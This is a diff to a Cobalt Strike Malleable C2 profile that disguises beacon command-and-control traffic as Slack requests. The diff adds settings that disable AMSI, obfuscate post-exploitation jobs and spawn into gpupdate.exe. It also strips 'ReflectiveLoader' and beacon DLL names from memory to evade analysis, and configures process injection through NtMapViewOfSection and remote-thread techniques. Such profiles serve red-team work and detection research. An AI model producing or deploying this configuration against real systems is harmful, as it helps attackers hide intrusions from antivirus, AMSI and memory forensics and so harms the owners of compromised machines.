@@ -1,7 +1,5 @@
 #slack profile
 #used a MS dev group from a 'top slack groups' list
-#setting the host header can mess things up if a LB, etc get involved. i.e. like domain fronting action. Comment/change Host: header if having issues!
-#I tested module stomp on Win10 x64 enterprise with several payload options.
 #xx0hcd
 
 
@@ -11,6 +9,21 @@ set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Geck
 set dns_idle "8.8.8.8";
 set maxdns    "235";
 
+#custom cert
+#https-certificate {
+#    set keystore "your_store_file.store";
+#    set password "your_store_pass";
+#}
+
+http-config {
+#    set headers "Server, Content-Type, Cache-Control, Connection";
+#    header "Content-Type" "text/html;charset=UTF-8";
+#    header "Connection" "close";
+#    header "Cache-Control" "max-age=2";
+#    header "Server" "nginx";
+    #set "true" if teamserver is behind redirector
+    set trust_x_forwarded_for "false";
+}
 
 http-get {
 
@@ -18,7 +31,7 @@ http-get {
     
     client {
 
-	header "Host" "msdevchat.slack.com";
+#        header "Host" "msdevchat.slack.com";
 	header "Accept" "*/*";
 	header "Accept-Language" "en-US";
 	header "Connection" "close";
@@ -105,7 +118,7 @@ http-post {
 
     client {
 
-	header "Host" "msdevchat.slack.com";
+#	header "Host" "msdevchat.slack.com";
 	header "Accept" "*/*";
 	header "Accept-Language" "en-US";     
         
@@ -193,12 +206,18 @@ http-stager {
 
 ###Malleable PE Options###
 
-#Using some of the new 3.11 options.
-#https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/
-#https://blog.cobaltstrike.com/2018/04/23/fighting-the-toolset/
+post-ex {
 
-set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+
+}
 
 #used peclone on wwanmm.dll. 
 #don't use 'set image_size_xx' if using 'set module_xx'
@@ -222,14 +241,41 @@ stage {
 	set module_x86 "wwanmm.dll";
 	set module_x64 "wwanmm.dll";
 
-#replace 'tell' strings that can show up in memory analysis, just putting a couple in here..
-	transform-x86 {
-	    strrep "ReflectiveLoader" "";
-	    strrep "beacon.dll" "winsku.dll";
-	}
+    transform-x86 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.dll" "";
+        }
 
-	transform-x64 {
-	    strrep "ReflectiveLoader" "";
-	    strrep "beacon.64.dll" "winsockhc.dll";
-	}
+    transform-x64 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.x64.dll" "";
+        }
+
+}
+process-inject {
+
+    set allocator "NtMapViewOfSection";		
+
+    set min_alloc "16700";
+
+    set userwx "false";  
+    
+    set startrwx "true";
+        
+    transform-x86 {
+        prepend "\x90\x90\x90";
+    }
+    transform-x64 {
+        prepend "\x90\x90\x90";
+    }
+
+    execute {
+        CreateThread "ntdll!RtlUserThreadStart";
+        CreateThread;
+        NtQueueApcThread;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
 }
